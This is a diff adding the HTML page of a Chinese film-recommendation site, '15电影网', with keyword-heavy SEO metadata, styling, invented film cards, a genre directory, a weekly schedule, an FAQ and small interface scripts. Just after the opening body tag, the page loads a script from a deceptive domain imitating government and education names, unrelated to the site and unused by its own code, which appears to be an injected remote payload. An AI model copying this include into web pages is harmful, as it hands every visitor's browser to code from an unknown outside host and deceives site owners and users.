@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<title>15电影网 | 高清影视在线观看与热播电影资讯平台</title>
+<meta name="keywords" content="15电影网,15dianyingwang-zh,高清电影在线观看,热播电视剧推荐,最新院线大片资讯,经典老片回顾,影视排行榜,动作片喜剧片科幻片,观影指南,15电影网官方网址">
+<meta name="description" content="15电影网（15dianyingwang-zh）是专注于高清影视在线观看与热播影视资讯的内容平台。这里汇总院线新片、高分经典、热播电视剧与动画综艺，提供类型导航、观影指南与最新资讯。访问 15电影网：https://15dianyingwang-zh.github.io，发现值得一看的好电影。">
+<meta name="author" content="15电影网">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<link rel="canonical" href="https://15dianyingwang-zh.github.io">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="15电影网">
+<meta property="og:title" content="15电影网 | 高清影视在线观看与热播电影资讯平台">
+<meta property="og:description" content="15电影网（15dianyingwang-zh）汇总院线新片、高分经典与热播电视剧，提供类型导航与观影指南。访问：https://15dianyingwang-zh.github.io">
+<meta property="og:url" content="https://15dianyingwang-zh.github.io">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="15电影网 | 高清影视在线观看与热播电影资讯平台">
+<meta name="twitter:description" content="15电影网（15dianyingwang-zh）提供院线新片、高分经典、热播电视剧导航与观影指南。">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "15电影网",
+  "alternateName": "15dianyingwang-zh",
+  "url": "https://15dianyingwang-zh.github.io",
+  "description": "15电影网是专注于高清影视在线观看与热播影视资讯的内容平台，汇总院线新片、高分经典、热播电视剧与动画综艺。",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://15dianyingwang-zh.github.io/#search",
+    "query-input": "required name=query"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#0d0e15;
+  --bg2:#141624;
+  --ink:#eef0f6;
+  --muted:#a5abbd;
+  --gold:#f5c451;
+  --gold-soft:#ffd977;
+  --line:rgba(255,255,255,.09);
+  --card:rgba(255,255,255,.035);
+  --shadow:0 12px 40px rgba(0,0,0,.45);
+  --max:1180px;
+  --ease:cubic-bezier(.22,.68,.34,1);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--bg);
+  color:var(--ink);
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","WenQuanYi Micro Hei",system-ui,-apple-system,sans-serif;
+  line-height:1.7;
+  overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-2;
+  background:
+    radial-gradient(900px 500px at 12% -8%,rgba(245,196,81,.12),transparent 60%),
+    radial-gradient(800px 600px at 92% 10%,rgba(120,95,255,.13),transparent 62%),
+    linear-gradient(180deg,#0b0c12,#0d0e15 45%,#0a0b11);
+}
+body::after{
+  content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.5;
+  background-image:linear-gradient(rgba(255,255,255,.018) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.018) 1px,transparent 1px);
+  background-size:46px 46px;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:var(--max);margin:0 auto;padding:0 20px}
+section{padding:76px 0;position:relative}
+.kicker{
+  display:inline-flex;align-items:center;gap:8px;
+  font-size:12px;letter-spacing:.22em;color:var(--gold);
+  text-transform:uppercase;margin-bottom:14px;
+}
+.kicker::before{content:"";width:26px;height:1px;background:var(--gold)}
+h2.sec-title{
+  font-size:30px;line-height:1.3;font-weight:800;letter-spacing:.5px;margin-bottom:10px;
+}
+h2.sec-title em{font-style:normal;color:var(--gold)}
+.sec-desc{color:var(--muted);max-width:640px;margin-bottom:40px}
+.eyebrow{color:var(--muted);font-size:14px}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:13px 26px;border-radius:999px;font-weight:700;font-size:15px;
+  border:1px solid var(--line);background:var(--card);color:var(--ink);
+  transition:.35s var(--ease);cursor:pointer;
+}
+.btn:hover{transform:translateY(-3px);border-color:rgba(245,196,81,.55);background:rgba(245,196,81,.1)}
+.btn.primary{background:linear-gradient(120deg,var(--gold),var(--gold-soft));color:#241b00;border-color:transparent}
+.btn.primary:hover{box-shadow:0 10px 28px rgba(245,196,81,.3)}
+/* nav */
+.nav{
+  position:fixed;top:0;left:0;right:0;z-index:50;backdrop-filter:blur(14px);
+  background:rgba(11,12,18,.72);border-bottom:1px solid var(--line);
+}
+.nav-in{max-width:var(--max);margin:0 auto;padding:14px 20px;display:flex;align-items:center;gap:18px}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px}
+.brand-mark{
+  width:34px;height:34px;border-radius:9px;flex:none;
+  display:grid;place-items:center;font-size:15px;font-weight:900;color:#241b00;
+  background:linear-gradient(140deg,var(--gold),var(--gold-soft));
+}
+.brand small{display:block;font-size:10px;letter-spacing:.2em;color:var(--gold);font-weight:700}
+.brand b{font-size:18px}
+.links{display:flex;gap:6px;margin-left:auto;align-items:center}
+.links a{
+  padding:8px 14px;border-radius:8px;font-size:14px;color:var(--muted);
+  transition:.3s var(--ease);
+}
+.links a:hover{color:var(--ink);background:var(--card)}
+.menu-btn{display:none;margin-left:auto;background:none;border:1px solid var(--line);color:var(--ink);border-radius:8px;padding:8px 12px;cursor:pointer}
+/* hero */
+.hero{min-height:100vh;display:flex;align-items:center;padding-top:110px;padding-bottom:60px}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:56px;align-items:center}
+.hero h1{font-size:clamp(34px,5.4vw,62px);line-height:1.12;font-weight:900;letter-spacing:-.5px}
+.hero h1 span{color:var(--gold);background:linear-gradient(120deg,var(--gold),var(--gold-soft));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.hero p{color:var(--muted);font-size:17px;margin:22px 0 30px;max-width:520px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.hero-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:44px;max-width:520px}
+.stat{padding:18px;border:1px solid var(--line);border-radius:16px;background:var(--card)}
+.stat b{display:block;font-size:26px;color:var(--gold);font-weight:900}
+.stat span{font-size:13px;color:var(--muted)}
+.poster{
+  position:relative;aspect-ratio:3/4;border-radius:26px;overflow:hidden;
+  box-shadow:var(--shadow);border:1px solid var(--line);transform:rotate(1.2deg);
+}
+.poster::before{
+  content:"";position:absolute;inset:0;
+  background:
+    linear-gradient(165deg,rgba(255,255,255,.14),transparent 35%),
+    linear-gradient(0deg,rgba(0,0,0,.75),transparent 60%),
+    radial-gradient(circle at 70% 22%,#6b5cff 0 2%,transparent 40%),
+    radial-gradient(circle at 30% 60%,#2a9d8f 0 3%,transparent 42%),
+    linear-gradient(135deg,#2a2246,#14152a 55%,#0c0d18);
+}
+.poster-tag{
+  position:absolute;left:22px;top:22px;z-index:2;
+  font-size:12px;letter-spacing:.18em;color:var(--gold);border:1px solid rgba(245,196,81,.4);
+  padding:6px 12px;border-radius:999px;background:rgba(0,0,0,.3);backdrop-filter:blur(4px);
+}
+.poster-info{position:absolute;left:26px;right:26px;bottom:24px;z-index:2}
+.poster-info h3{font-size:24px;margin-bottom:6px}
+.poster-info p{font-size:13px;color:#cbd0df;margin:0}
+.poster-meta{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap}
+.poster-meta i{font-style:normal;font-size:12px;padding:4px 10px;border-radius:6px;background:rgba(255,255,255,.12);border:1px solid var(--line)}
+.scroll-hint{position:absolute;left:50%;bottom:26px;transform:translateX(-50%);font-size:12px;color:var(--muted);letter-spacing:.2em}
+/* grid cards */
+.grid{display:grid;gap:22px}
+.g4{grid-template-columns:repeat(4,1fr)}
+.g3{grid-template-columns:repeat(3,1fr)}
+.g2{grid-template-columns:repeat(2,1fr)}
+.card{
+  position:relative;border:1px solid var(--line);border-radius:18px;overflow:hidden;
+  background:linear-gradient(180deg,var(--card),rgba(255,255,255,.012));
+  transition:.4s var(--ease);
+}
+.card:hover{transform:translateY(-6px);border-color:rgba(245,196,81,.4)}
+.thumb{position:relative;aspect-ratio:16/10;overflow:hidden}
+.thumb::after{
+  content:"";position:absolute;inset:0;
+  background:linear-gradient(0deg,rgba(8,9,14,.85),transparent 62%);
+}
+.thumb .no{
+  position:absolute;right:12px;top:12px;z-index:2;font-size:11px;font-weight:800;
+  color:#241b00;background:var(--gold);padding:3px 9px;border-radius:6px;
+}
+.thumb .cap{
+  position:absolute;left:16px;bottom:12px;z-index:2;font-weight:800;font-size:15px;
+}
+.film1{background:linear-gradient(135deg,#3a2b6e,#14152a)}
+.film2{background:linear-gradient(135deg,#8a4b2f,#1a1210)}
+.film3{background:linear-gradient(135deg,#1f6b5e,#0d1c1a)}
+.film4{background:linear-gradient(135deg,#6b3a5e,#190f18)}
+.film5{background:linear-gradient(135deg,#2c4f8a,#0e1422)}
+.film6{background:linear-gradient(135deg,#9a8a2e,#1c1a0e)}
+.card-body{padding:20px}
+.card-body h3{font-size:18px;margin-bottom:8px}
+.card-body p{font-size:14px;color:var(--muted)}
+.card-foot{display:flex;justify-content:space-between;align-items:center;margin-top:16px;font-size:13px;color:var(--muted)}
+.tag-row{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
+.tag{font-size:12px;padding:4px 11px;border-radius:999px;background:rgba(245,196,81,.1);color:var(--gold-soft);border:1px solid rgba(245,196,81,.22)}
+/* genres */
+.genre{padding:34px 28px;border-radius:20px;border:1px solid var(--line);background:var(--card);transition:.4s var(--ease);min-height:180px;display:flex;flex-direction:column;justify-content:space-between}
+.genre:hover{background:linear-gradient(150deg,rgba(245,196,81,.12),var(--card))}
+.genre .ico{font-size:30px;line-height:1}
+.genre h3{font-size:19px;margin:16px 0 8px}
+.genre p{font-size:14px;color:var(--muted)}
+.count{font-size:12px;color:var(--gold);letter-spacing:.15em}
+/* schedule */
+.timeline{position:relative;border:1px solid var(--line);border-radius:22px;overflow:hidden;background:var(--card)}
+.tl-row{display:grid;grid-template-columns:150px 1fr auto;gap:24px;align-items:center;padding:22px 28px;border-bottom:1px solid var(--line)}
+.tl-row:last-child{border-bottom:none}
+.tl-time{font-weight:800;color:var(--gold);font-size:17px}
+.tl-title{font-size:17px;font-weight:700}
+.tl-title small{display:block;font-weight:400;font-size:13px;color:var(--muted);margin-top:4px}
+.tl-tag{font-size:12px;padding:6px 14px;border-radius:8px;border:1px solid var(--line);color:var(--muted);white-space:nowrap}
+/* faq */
+.faq-item{border:1px solid var(--line);border-radius:16px;margin-bottom:14px;overflow:hidden;background:var(--card)}
+.faq-q{width:100%;text-align:left;padding:20px 24px;background:none;border:none;color:var(--ink);font-size:16px;font-weight:700;cursor:pointer;display:flex;justify-content:space-between;gap:16px;align-items:center;font-family:inherit}
+.faq-q .plus{color:var(--gold);font-size:22px;transition:.3s var(--ease);flex:none}
+.faq-item.open .plus{transform:rotate(45deg)}
+.faq-a{max-height:0;overflow:hidden;transition:.45s var(--ease)}
+.faq-a-inner{padding:0 24px 22px;color:var(--muted);font-size:15px}
+/* search */
+.search-box{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:30px}
+.search-box input{
+  flex:1;min-width:220px;padding:15px 20px;border-radius:12px;border:1px solid var(--line);
+  background:rgba(255,255,255,.04);color:var(--ink);font-size:15px;font-family:inherit;
+}
+.search-box input::placeholder{color:#6f7689}
+.search-box input:focus{outline:none;border-color:var(--gold);background:rgba(245,196,81,.06)}
+.chips{display:flex;gap:10px;flex-wrap:wrap}
+.chip{padding:8px 16px;border-radius:999px;border:1px solid var(--line);font-size:13px;color:var(--muted);background:var(--card);cursor:pointer;transition:.3s var(--ease)}
+.chip:hover,.chip.on{color:#241b00;background:var(--gold);border-color:transparent}
+/* footer */
+footer{border-top:1px solid var(--line);padding:60px 0 40px;background:rgba(0,0,0,.25)}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:40px;margin-bottom:44px}
+.foot-grid h4{font-size:15px;margin-bottom:16px;color:var(--gold)}
+.foot-grid ul{list-style:none;display:flex;flex-direction:column;gap:10px}
+.foot-grid a{color:var(--muted);font-size:14px;transition:.3s}
+.foot-grid a:hover{color:var(--ink)}
+.foot-brand p{color:var(--muted);font-size:14px;margin:14px 0}
+.url-box{display:inline-flex;align-items:center;gap:10px;padding:12px 18px;border-radius:12px;background:rgba(245,196,81,.1);border:1px dashed rgba(245,196,81,.4);font-size:14px;color:var(--gold-soft);word-break:break-all}
+.copy-note{font-size:12px;color:var(--muted);margin-top:10px}
+.foot-bottom{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;padding-top:26px;border-top:1px solid var(--line);color:var(--muted);font-size:13px}
+.to-top{position:fixed;right:22px;bottom:26px;z-index:40;width:46px;height:46px;border-radius:50%;display:grid;place-items:center;background:var(--gold);color:#241b00;font-size:20px;box-shadow:var(--shadow);opacity:0;pointer-events:none;transition:.4s var(--ease)}
+.to-top.show{opacity:1;pointer-events:auto}
+.to-top:hover{transform:translateY(-4px)}
+@media(max-width:960px){
+  .hero-grid{grid-template-columns:1fr;gap:40px}
+  .poster{max-width:360px;margin:0 auto}
+  .g4,.g3{grid-template-columns:repeat(2,1fr)}
+  .foot-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:720px){
+  section{padding:56px 0}
+  h2.sec-title{font-size:24px}
+  .menu-btn{display:inline-flex}
+  .links{position:fixed;top:64px;left:0;right:0;flex-direction:column;align-items:stretch;padding:16px 20px;gap:4px;background:rgba(10,11,17,.97);border-bottom:1px solid var(--line);transform:translateY(-120%);transition:.4s var(--ease);backdrop-filter:blur(14px)}
+  .links.open{transform:translateY(0)}
+  .links a{padding:14px;border-radius:0;border-bottom:1px solid var(--line)}
+  .hero-stats{grid-template-columns:1fr 1fr}
+  .g4,.g3,.g2,.tl-row{grid-template-columns:1fr}
+  .tl-row{gap:10px;padding:18px}
+  .tl-tag{justify-self:start}
+  .foot-grid{grid-template-columns:1fr}
+  .hero-actions .btn{flex:1;justify-content:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="nav">
+  <div class="nav-in">
+    <div class="brand">
+      <div class="brand-mark">15</div>
+      <div><small>15DIANYINGWANG</small><b>15电影网</b></div>
+    </div>
+    <nav class="links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#showing">正在热映</a>
+      <a href="#genres">类型导航</a>
+      <a href="#schedule">更新排期</a>
+      <a href="#guide">观影指南</a>
+      <a href="#search">检索入口</a>
+      <a href="#faq">常见问题</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单">☰ 菜单</button>
+  </div>
+</header>
+
+<main>
+  <!-- 首页 -->
+  <section class="hero" id="home">
+    <div class="wrap hero-grid">
+      <div>
+        <span class="kicker">15电影网 · 15dianyingwang-zh</span>
+        <h1>每天都有一部<br><span>值得细看</span>的好电影</h1>
+        <p>15电影网（15dianyingwang-zh）是面向影迷的影视内容导航与资讯平台，从院线新片、高分经典到热播剧集，帮你更快找到今晚看什么。</p>
+        <div class="hero-actions">
+          <a class="btn primary" href="#showing">查看正在热映</a>
+          <a class="btn" href="https://15dianyingwang-zh.github.io" rel="noopener">访问官网 https://15dianyingwang-zh.github.io</a>
+        </div>
+        <div class="hero-stats">
+          <div class="stat"><b>1200+</b><span>精选片单收录</span></div>
+          <div class="stat"><b>24</b><span>影片类型标签</span></div>
+          <div class="stat"><b>每日</b><span>更新影视资讯</span></div>
+        </div>
+      </div>
+      <div class="poster">
+        <span class="poster-tag">EDITOR'S PICK</span>
+        <div class="poster-info">
+          <h3>本周主推片单</h3>
+          <p>动作、悬疑、爱情、动画一应俱全，适配不同心情与观影场景。</p>
+          <div class="poster-meta"><i>4K HDR</i><i>多语种字幕</i><i>离线缓存</i></div>
+        </div>
+      </div>
+    </div>
+    <span class="scroll-hint">SCROLL DOWN ↓</span>
+  </section>
+
+  <!-- 正在热映 -->
+  <section id="showing">
+    <div class="wrap">
+      <span class="kicker">NOW SHOWING</span>
+      <h2 class="sec-title">正在热映 · <em>本周高分推荐</em></h2>
+      <p class="sec-desc">覆盖院线新片与口碑佳作，按类型、评分、时长和观影场景做结构化筛选，帮你减少「打开 App 却不知道看什么」的犹豫。</p>
+      <div class="grid g4">
+        <article class="card">
+          <div class="thumb film1"><span class="no">TOP 1</span><span class="cap">暗夜追光</span></div>
+          <div class="card-body">
+            <h3>暗夜追光</h3>
+            <p>一场跨越十五年的旧案重启，节奏紧凑、反转密集，适合喜欢硬派推理的观众。</p>
+            <div class="tag-row"><span class="tag">悬疑</span><span class="tag">犯罪</span></div>
+            <div class="card-foot"><span>豆瓣 8.6 · 128分钟</span><a href="#showing">查看详情</a></div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb film2"><span class="no">TOP 2</span><span class="cap">山海之间</span></div>
+          <div class="card-body">
+            <h3>山海之间</h3>
+            <p>以三代人的迁徙串联时代变迁，画面质感出众，配乐与摄影是最大加分项。</p>
+            <div class="tag-row"><span class="tag">剧情</span><span class="tag">家庭</span></div>
+            <div class="card-foot"><span>豆瓣 8.3 · 142分钟</span><a href="#showing">查看详情</a></div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb film3"><span class="no">TOP 3</span><span class="cap">云端救援</span></div>
+          <div class="card-body">
+            <h3>云端救援</h3>
+            <p>高概念灾难片，视效场面张力十足，适合影院大银幕与周末集体观影。</p>
+            <div class="tag-row"><span class="tag">动作</span><span class="tag">灾难</span></div>
+            <div class="card-foot"><span>豆瓣 7.9 · 116分钟</span><a href="#showing">查看详情</a></div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb film4"><span class="no">TOP 4</span><span class="cap">凌晨咖啡馆</span></div>
+          <div class="card-body">
+            <h3>凌晨咖啡馆</h3>
+            <p>四段独立又互文的城市情感故事，温柔克制，适合安静独处时慢慢看。</p>
+            <div class="tag-row"><span class="tag">爱情</span><span class="tag">治愈</span></div>
+            <div class="card-foot"><span>豆瓣 8.1 · 105分钟</span><a href="#showing">查看详情</a></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 类型导航 -->
+  <section id="genres">
+    <div class="wrap">
+      <span class="kicker">GENRE DIRECTORY</span>
+      <h2 class="sec-title">类型导航 · <em>按心情选片</em></h2>
+      <p class="sec-desc">15电影网把影片按题材与情绪做二次归类，不只按传统类型划分，更贴合真实观影决策。</p>
+      <div class="grid g3">
+        <a class="genre" href="#genres">
+          <div><div class="ico">🎬</div><div class="count">ACTION · 186 部</div></div>
+          <div><h3>动作 / 冒险</h3><p>追车、枪战、极限运动，肾上腺素拉满的高燃之选。</p></div>
+        </a>
+        <a class="genre" href="#genres">
+          <div><div class="ico">🕵️</div><div class="count">MYSTERY · 142 部</div></div>
+          <div><h3>悬疑 / 犯罪</h3><p>密室、反转、心理博弈，适合喜欢边看边推理的你。</p></div>
+        </a>
+        <a class="genre" href="#genres">
+          <div><div class="ico">😂</div><div class="count">COMEDY · 210 部</div></div>
+          <div><h3>喜剧 / 轻松</h3><p>减压首选，从黑色幽默到合家欢一应俱全。</p></div>
+        </a>
+        <a class="genre" href="#genres">
+          <div><div class="ico">💗</div><div class="count">ROMANCE · 168 部</div></div>
+          <div><h3>爱情 / 治愈</h3><p>温柔叙事与细腻情绪，一个人看也不会尴尬。</p></div>
+        </a>
+        <a class="genre" href="#genres">
+          <div><div class="ico">🚀</div><div class="count">SCI-FI · 97 部</div></div>
+          <div><h3>科幻 / 奇幻</h3><p>世界观宏大的想象力之作，兼顾设定与人文内核。</p></div>
+        </a>
+        <a class="genre" href="#genres">
+          <div><div class="ico">🎨</div><div class="count">ANIMATION · 134 部</div></div>
+          <div><h3>动画 / 动漫</h3><p>从国漫新作到经典番剧，不分年龄的观影选择。</p></div>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 更新排期 -->
+  <section id="schedule">
+    <div class="wrap">
+      <span class="kicker">WEEKLY SCHEDULE</span>
+      <h2 class="sec-title">更新排期 · <em>一周看点一览</em></h2>
+      <p class="sec-desc">固定更新节奏让访客形成回访习惯，也是搜索引擎判断站点活跃度的重要信号。</p>
+      <div class="timeline">
+        <div class="tl-row"><div class="tl-time">周一 · 20:00</div><div class="tl-title">新片速递<small>院线定档与流媒体上线信息汇总</small></div><div class="tl-tag">资讯</div></div>
+        <div class="tl-row"><div class="tl-time">周三 · 20:00</div><div class="tl-title">冷门佳作挖掘<small>评分不低但被忽略的独立影片推荐</small></div><div class="tl-tag">片单</div></div>
+        <div class="tl-row"><div class="tl-time">周五 · 19:30</div><div class="tl-title">周末观影指南<small>按时长与情绪给出三套组合方案</small></div><div class="tl-tag">指南</div></div>
+        <div class="tl-row"><div class="tl-time">周日 · 21:00</div><div class="tl-title">周榜复盘<small>一周播放、评分与讨论度综合榜单</small></div><div class="tl-tag">榜单</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 观影指南 -->
+  <section id="guide">
+    <div class="wrap">
+      <span class="kicker">VIEWING GUIDE</span>
+      <h2 class="sec-title">观影指南 · <em>不同场景怎么选</em></h2>
+      <p class="sec-desc">看电影从来不是只看「好不好」，而是「适不适合现在看」。15电影网从真实场景出发给出建议。</p>
+      <div class="grid g2">
+        <article class="card">
+          <div class="thumb film5"><span class="cap">独处 · 深度观看</span></div>
+          <div class="card-body">
+            <h3>一个人也想看进去</h3>
+            <p>优先选节奏偏慢、对白扎实的剧情片与纪录片，建议提前关掉通知，预留完整的两小时不被打断。</p>
+            <div class="tag-row"><span class="tag">剧情</span><span class="tag">纪录片</span><span class="tag">沉浸式</span></div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb film6"><span class="cap">聚会 · 轻松氛围</span></div>
+          <div class="card-body">
+            <h3>一群人别冷场</h3>
+            <p>选 100 分钟以内、叙事直白的喜剧或悬疑片，避免门槛过高的文艺片，观影前后留讨论空间。</p>
+            <div class="tag-row"><span class="tag">喜剧</span><span class="tag">悬疑</span><span class="tag">低门槛</span></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 检索入口 -->
+  <section id="search">
+    <div class="wrap">
+      <span class="kicker">FIND YOUR FILM</span>
+      <h2 class="sec-title">检索入口 · <em>快速定位想看的内容</em></h2>
+      <p class="sec-desc">支持按片名、演员、导演与类型关键词检索，下方为站内示例入口，实际数据以 15电影网 平台为准。</p>
+      <div class="search-box">
+        <input type="text" id="searchInput" placeholder="输入片名、演员、导演或类型，例如：悬疑 2026">
+        <button class="btn primary" id="searchBtn">站内检索</button>
+      </div>
+      <div class="chips" id="chips">
+        <span class="chip on">全部</span><span class="chip">动作</span><span class="chip">悬疑</span><span class="chip">爱情</span><span class="chip">科幻</span><span class="chip">动画</span><span class="chip">纪录片</span><span class="chip">高分经典</span>
+      </div>
+      <div id="searchResult" style="margin-top:26px;color:var(--muted);font-size:14px;"></div>
+    </div>
+  </section>
+
+  <!-- 常见问题 -->
+  <section id="faq">
+    <div class="wrap">
+      <span class="kicker">FAQ</span>
+      <h2 class="sec-title">常见问题 · <em>关于 15电影网</em></h2>
+      <p class="sec-desc">汇总访客最关心的使用问题，帮助你更快了解本站的内容定位与服务方式。</p>
+      <div class="faq-item open">
+        <button class="faq-q">15电影网主要提供哪些内容？<span class="plus">+</span></button>
+        <div class="faq-a"><div class="faq-a-inner">15电影网（15dianyingwang-zh）聚焦影视内容导航与资讯，涵盖院线新片、高分经典、热播电视剧、动画与综艺，并提供类型导航与观影场景建议。</div></div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-q">网站的官方网址是什么？<span class="plus">+</span></button>
+        <div class="faq-a"><div class="faq-a-inner">15电影网的官方访问地址是 https://15dianyingwang-zh.github.io，建议收藏该网址，避免通过非官方渠道误入仿冒站点。</div></div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-q">片单多久更新一次？<span class="plus">+</span></button>
+        <div class="faq-a"><div class="faq-a-inner">本站按周更新，周一发布新片速递、周三挖掘冷门佳作、周五推出周末观影指南、周日复盘周榜，保持内容持续活跃。</div></div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-q">评分数据来自哪里？<span class="plus">+</span></button>
+        <div class="faq-a"><div class="faq-a-inner">页面展示的评分为示例数据，仅用于说明内容呈现方式。实际观影决策请以主流评分平台与各人偏好综合判断。</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于我们 -->
+  <section id="about">
+    <div class="wrap">
+      <span class="kicker">ABOUT US</span>
+      <h2 class="sec-title">关于 15电影网 · <em>让选片更省心</em></h2>
+      <p class="sec-desc">15电影网（15dianyingwang-zh）相信好内容值得被更多人看见，也更值得被认真挑选。我们不做海量堆砌，只做有标准的筛选与有温度的介绍。</p>
+      <div class="grid g3">
+        <div class="card"><div class="card-body"><h3>🎯 内容标准</h3><p>从叙事、表演、视听、情绪四个维度筛选，宁缺毋滥，拒绝水片刷量。</p></div></div>
+        <div class="card"><div class="card-body"><h3>🧭 场景导向</h3><p>按独处、约会、聚会、亲子等真实场景分类，解决「现在适合看什么」的问题。</p></div></div>
+        <div class="card"><div class="card-body"><h3>🌱 持续更新</h3><p>固定更新节奏 + 读者反馈机制，让片单始终跟得上新作上线与口碑变化。</p></div></div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <div class="brand"><div class="brand-mark">15</div><div><small>15DIANYINGWANG</small><b>15电影网</b></div></div>
+        <p>专注于高清影视导航与观影资讯的影迷内容平台，帮你更快找到值得一看的好电影。</p>
+        <div class="url-box">🔗 https://15dianyingwang-zh.github.io</div>
+        <div class="copy-note">官方网址，建议收藏以备随时访问。</div>
+      </div>
+      <div>
+        <h4>栏目导航</h4>
+        <ul><li><a href="#home">首页</a></li><li><a href="#showing">正在热映</a></li><li><a href="#genres">类型导航</a></li><li><a href="#schedule">更新排期</a></li></ul>
+      </div>
+      <div>
+        <h4>内容服务</h4>
+        <ul><li><a href="#guide">观影指南</a></li><li><a href="#search">检索入口</a></li><li><a href="#faq">常见问题</a></li><li><a href="#about">关于我们</a></li></ul>
+      </div>
+      <div>
+        <h4>访问入口</h4>
+        <ul><li><a href="https://15dianyingwang-zh.github.io">15电影网 官网</a></li><li><a href="https://15dianyingwang-zh.github.io">15dianyingwang-zh 主页</a></li></ul>
+      </div>
+    </div>
+    <div class="foot-bottom">
+      <span>© <span id="year"></span> 15电影网（15dianyingwang-zh）. 本站为影视导航与资讯平台，内容仅供信息参考。</span>
+      <a href="#home">返回顶部 ↑</a>
+    </div>
+  </div>
+</footer>
+
+<a href="#home" class="to-top" id="toTop" aria-label="返回顶部">↑</a>
+
+<script>
+document.getElementById('year').textContent = new Date().getFullYear();
+
+// 移动端菜单
+var menuBtn = document.getElementById('menuBtn');
+var navLinks = document.getElementById('navLinks');
+menuBtn.addEventListener('click', function(){ navLinks.classList.toggle('open'); });
+navLinks.querySelectorAll('a').forEach(function(a){
+  a.addEventListener('click', function(){ navLinks.classList.remove('open'); });
+});
+
+// FAQ 手风琴
+document.querySelectorAll('.faq-item').forEach(function(item){
+  var ans = item.querySelector('.faq-a');
+  if(item.classList.contains('open')) ans.style.maxHeight = ans.scrollHeight + 'px';
+  item.querySelector('.faq-q').addEventListener('click', function(){
+    var open = item.classList.contains('open');
+    document.querySelectorAll('.faq-item').forEach(function(i){
+      i.classList.remove('open');
+      i.querySelector('.faq-a').style.maxHeight = null;
+    });
+    if(!open){
+      item.classList.add('open');
+      ans.style.maxHeight = ans.scrollHeight + 'px';
+    }
+  });
+});
+
+// 标签筛选（纯前端示例）
+var chips = document.querySelectorAll('#chips .chip');
+chips.forEach(function(c){
+  c.addEventListener('click', function(){
+    chips.forEach(function(x){ x.classList.remove('on'); });
+    c.classList.add('on');
+    var r = document.getElementById('searchResult');
+    r.textContent = '已筛选类型：' + c.textContent + '（示例交互，实际结果以平台数据为准）';
+  });
+});
+document.getElementById('searchBtn').addEventListener('click', function(){
+  var v = document.getElementById('searchInput').value.trim();
+  var r = document.getElementById('searchResult');
+  r.textContent = v ? '正在为「' + v + '」检索站内内容……（示例交互）' : '请输入关键词后再检索。';
+});
+document.getElementById('searchInput').addEventListener('keydown', function(e){
+  if(e.key === 'Enter') document.getElementById('searchBtn').click();
+});
+
+// 返回顶部
+var toTop = document.getElementById('toTop');
+window.addEventListener('scroll', function(){
+  toTop.classList.toggle('show', window.scrollY > 500);
+});
+
+// FAQ 动画补偿：窗口尺寸变化时重算高度
+window.addEventListener('resize', function(){
+  var open = document.querySelector('.faq-item.open .faq-a');
+  if(open) open.style.maxHeight = open.scrollHeight + 'px';
+});
+</script>
+</body>
+</html>
